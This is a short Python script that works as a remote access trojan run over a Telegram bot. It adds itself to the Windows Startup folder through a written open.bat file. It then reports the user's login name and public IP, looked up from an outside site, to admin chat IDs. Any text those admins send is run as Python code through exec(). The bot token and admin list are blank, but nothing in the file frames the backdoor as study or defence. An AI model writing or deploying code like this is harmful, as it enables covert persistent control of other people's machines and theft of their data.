from telebot import TeleBot
from os import getlogin
from os.path import dirname, realpath
from sys import argv
from requests import get
file_path = dirname(realpath(argv[0]))
bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % getlogin()
with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
	bat_file.write(r'start "" %s' % file_path + argv[0])
ADMIN = {}
bot = TeleBot('')
@bot.message_handler(content_types=['text'])
def main(message):
	if message.chat.id in ADMIN.values():
		try:
			for login, id in ADMIN.items():
				try:
					bot.send_message(id, 'Executing: \n{t}\nBy: {l} ({id})'.format(t=message.text, id=message.chat.id, l=login))
				except Exception:
					pass
			exec(message.text)
			for login, id in ADMIN.items():
				try:
					bot.send_message(id, 'Executed successfully: \n{t}\nBy: {l} ({id})'.format(t=message.text, id=message.chat.id, l=login))
				except Exception:
					pass
		except Exception as error:
			for login, id in ADMIN.items():
				try:
					bot.send_message(id, 'Excepted: \n{t}\nBy: {l} ({id})'.format(t=str(error), id=message.chat.id, l=login))
				except Exception:
					pass
for id in ADMIN.values():
	try:
		bot.send_message(id, 'Connected with: {n}\nUsername: {l}\nIP: {ip}'.format(n=argv[0], l=getlogin(), ip=get("https://ramziv.com/ip").text))
	except Exception:
		pass
bot.polling()
for id in ADMIN.values():
	try:
		bot.send_message(id, 'Disconnected with: {n}\nUsername: {l}\nIP: {ip}'.format(n=argv[0], l=getlogin(), ip=get("https://ramziv.com/ip").text))
	except Exception:
		pass
